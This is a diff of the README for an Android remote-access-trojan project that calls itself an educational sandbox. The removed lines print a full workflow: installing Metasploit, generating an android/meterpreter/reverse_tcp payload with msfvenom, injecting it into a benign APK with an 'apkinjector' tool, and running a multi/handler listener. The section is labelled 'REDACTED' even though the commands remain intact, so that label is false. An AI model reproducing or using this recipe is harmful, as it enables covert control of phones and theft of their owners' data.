@@ -7,7 +7,7 @@ Suggested GitHub topics/tags (add to repo): android, android-rat, rat, remote-ac
 
 **Project:** [F3Manta-Android-RAT](https://github.com/MrF3ri/F3Manta-Android-RAT) • **Author:** mr f3ri • **Telegram:** `@sudoferi`
 
-**Short description:**  
+**Short description (for search):**  
 F3‑MANTA — an **educational Android RAT sandbox** and **Android post‑exploitation lab** demonstrating Android WebView samples, safe payload concepts, build recipes, and defensive detection/hardening guidance for researchers and instructors.
 
 **Audience:** Students, researchers, instructors, red/blue teams, and conference/lab attendees.  
@@ -15,7 +15,7 @@ F3‑MANTA — an **educational Android RAT sandbox** and **Android post‑explo
 
 ---
 
-![badge-placeholder](https://img.shields.io/badge/educational--sandbox-blue) ![license-placeholder](https://img.shields.io/badge/license--placeholder-lightgrey)
+![educational-sandbox](https://img.shields.io/badge/educational--sandbox-blue) ![license-placeholder](https://img.shields.io/badge/license--placeholder-lightgrey)
 
 ---
 
@@ -32,25 +32,15 @@ This repository contains a **benign Android WebView sample**, exact build steps,
 - [F3‑MANTA — Mobile Attack \& Network Testing Arena (Android RAT)](#f3manta--mobile-attack--network-testing-arena-android-rat)
   - [TL;DR — Android RAT lab, analysis sandbox, and demo-ready artifacts](#tldr--android-rat-lab-analysis-sandbox-and-demo-ready-artifacts)
   - [Table of Contents](#table-of-contents)
-  - [About](#about)
+  - [About / Searchable summary](#about--searchable-summary)
   - [Why F3‑MANTA (Android RAT sandbox)](#why-f3manta-android-rat-sandbox)
-  - [Features](#features)
-  - [Disclaimer \& Ethics  (required)](#disclaimer--ethics--required)
-  - [Prerequisites (exact commands)](#prerequisites-exact-commands)
-  - [Build the example APK (exact commands)](#build-the-example-apk-exact-commands)
-  - [Payload creation, binding, and runtime listener — **REDACTED**](#payload-creation-binding-and-runtime-listener--redacted)
-    - [Example: prepare the analysis lab and tools](#example-prepare-the-analysis-lab-and-tools)
-    - [Example: create a payload artifact](#example-create-a-payload-artifact)
-    - [Example: bind or inject payload into APK](#example-bind-or-inject-payload-into-apk)
-    - [Example: inspect modified smali/manifest](#example-inspect-modified-smalimanifest)
-    - [Example: runtime listener / handler](#example-runtime-listener--handler)
-  - [Recommended isolated workflow](#recommended-isolated-workflow)
-  - [Safety \& hardening recommendations (MUST read)](#safety--hardening-recommendations-must-read)
-  - [Demo tips for conferences](#demo-tips-for-conferences)
+  - [Features (what this Android RAT demo shows)](#features-what-this-android-rat-demo-shows)
+  - [Disclaimer \& Ethics (required)](#disclaimer--ethics-required)
+  - [Prerequisites (exact commands — unchanged)](#prerequisites-exact-commands--unchanged)
 
 ---
 
-## About
+## About / Searchable summary
 
 F3‑MANTA is an **educational Android RAT sandbox** and **mobile post‑exploitation lab** that demonstrates core concepts commonly discussed in Android RAT research:
 
@@ -72,7 +62,7 @@ This README intentionally uses common and alternate search terms (Android RAT, A
 
 ---
 
-## Features
+## Features (what this Android RAT demo shows)
 
 - 🔴 Real time monitoring (demo telemetry)  
 - 🌐 Custom WebView sample (benign demo app)  
@@ -98,7 +88,7 @@ This README intentionally uses common and alternate search terms (Android RAT, A
 
 ---
 
-## Disclaimer & Ethics  (required)
+## Disclaimer & Ethics (required)
 
 > **Important:** This repository is strictly for **educational, research, and defensive** purposes. You must have **explicit written permission** to test or interact with any device, network, or resource you do not own.
 
@@ -106,7 +96,7 @@ Misuse of materials in this repository may be illegal and unethical. If you are 
 
 ---
 
-## Prerequisites (exact commands)
+## Prerequisites (exact commands — unchanged)
 
 > Run these **inside an isolated lab VM** (Kali Linux / Debian / Ubuntu example). These commands install an OpenJDK and Android command‑line tools.
 
@@ -131,133 +121,4 @@ source ~/.bashrc
 # Install SDK components
 sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.2"
 ```
-
-**Note:** Perform all installs and SDK setup inside an isolated VM. Do not run untrusted binaries on production hosts.
-
----
-
-## Build the example APK (exact commands)
-
-> These steps produce a benign debug APK that you may install only on an isolated emulator or lab device.
-
-```bash
-# move to the Android project
-cd ./F3-Manta/AndroidWebViewCode
-
-nano ./app/src/main/assets/config.json
-# edit the sample app config (assets/config.json)
-# Example content (change the URL only to a safe, known internal target if needed):
-# {
-#     "url": "https://google.com"
-# }
-
-
-# build the debug APK
-./gradlew assembleDebug
-
-# copy the artifact into the Lab folder for demos/analysis
-cp ./app/build/outputs/apk/debug/app-debug.apk ../Lab/original.apk
-```
-
----
-
-## Payload creation, binding, and runtime listener — **REDACTED**
-
-The commands that would generate exploit payloads, bind/inject artifacts into APKs, or run post‑exploit listeners are intentionally **redacted** in this public README. Below each redaction you will find **conceptual notes** so readers understand the *high‑level* workflow without exposing actionable steps.
-
-### Example: prepare the analysis lab and tools
-```
-sudo apt update && sudo apt upgrade -y
-```
-```
-sudo apt install metasploit-framework -y
-```
-```
-msfvenom --version
-```
-```
-msfconsole --version
-```
-**Conceptual note:** This normally installs research frameworks and tools inside a private analysis VM. For public distribution we do **not** list or link to offensive tooling.
-
-### Example: create a payload artifact
-```
-cd ../Lab
-```
-```
-msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-system-ip> LPORT=<port:4444> -o payload.apk -f raw
-```
-**Conceptual note:** In an authorised lab, this step generates a test payload. 
-
-### Example: bind or inject payload into APK
-```
-chmod +x ./apkinjector
-```
-```
-./apkinjector
-```
-**Conceptual note:** Injection merges payload code with a target APK. The public repo omits binding recipes — present this conceptually or use inert artifacts included in `Lab/`.
-
-### Example: inspect modified smali/manifest
-```
-./apkinjector ./payload.apk ./original.apk
-```
-If you can’t find the .smali file path, run the command below to list matching files and then enter the correct path manually.
-```
-find /tmp/original -type f -name 'MainActivity.smali' -print
-```
-
-**Conceptual note:** Analysts would inspect `smali/` changes and manifest entries with static analysis tools inside the isolated lab to find tampering indicators.
-
-### Example: runtime listener / handler
-```
-msfconsole -q
-```
-```
-use exploit/multi/handler
-```
-```
-set payload android/meterpreter/reverse_tcp
-```
-```
-set LHOST <your-system-ip>
-```
-```
-set LPORT <port:4444>
-```
-
-**Conceptual note:** A listener conceptually receives callbacks from a payload. For public demos, show sanitized recordings or mock transcripts — **do not** publish live handler instructions.
-
----
-
-
-## Recommended isolated workflow
-
-1. Create fresh VM snapshots for: **builder**, **target** (emulator), and **analyst**.
-2. Use host‑only or VLAN networks; **block outbound Internet** from lab VMs.
-3. Separate roles: keep build, target, and analysis on different machines.
-4. Instrument and capture: use packet capture, process tracing, and centralized logging on an analysis VM.
-5. Revert snapshots after every demo and securely delete ephemeral artifacts.
-
----
-
-## Safety & hardening recommendations (MUST read)
-
-- **Written authorization:** Obtain explicit written permission before testing any system you do not own.  
-- **Least privilege:** Run only processes with necessary privileges; avoid running as `root` unless required.  
-- **No real data:** Never use production credentials or real user data inside the lab.  
-- **Audit & logging:** Keep auditable trails for all actions and artifacts.  
-- **Access controls:** Keep `Lab/` artifacts private and delete them when no longer required.  
-- **Clear disclaimers:** Display legal/ethical disclaimers on slides and materials distributed with demos.
-
----
-
-## Demo tips for conferences
-
-- Prepare a short, high‑resolution GIF as a fallback for live demos.  
-- Show a concise architecture diagram that emphasizes isolation (builder → target → analyst).  
-- Emphasize detection and mitigation: what defenders should look for and how to respond.  
-- Include a dedicated slide about Ethics & Legal Boundaries.
-
-
 
